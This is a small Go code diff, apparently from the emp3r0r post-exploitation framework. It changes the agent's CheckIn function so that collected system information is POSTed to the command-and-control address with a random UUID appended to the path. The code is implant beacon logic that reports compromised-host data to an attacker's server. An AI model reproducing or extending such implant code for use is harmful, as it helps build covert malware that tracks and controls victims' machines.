@@ -16,6 +16,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/posener/h2conn"
 )
@@ -29,7 +30,7 @@ func CheckIn() error {
 	if err != nil {
 		return err
 	}
-	_, err = HTTPClient.Post(CCAddress+tun.CheckInAPI, "application/json", bytes.NewBuffer(sysinfoJSON))
+	_, err = HTTPClient.Post(CCAddress+tun.CheckInAPI+"/"+uuid.NewString(), "application/json", bytes.NewBuffer(sysinfoJSON))
 	if err != nil {
 		return err
 	}
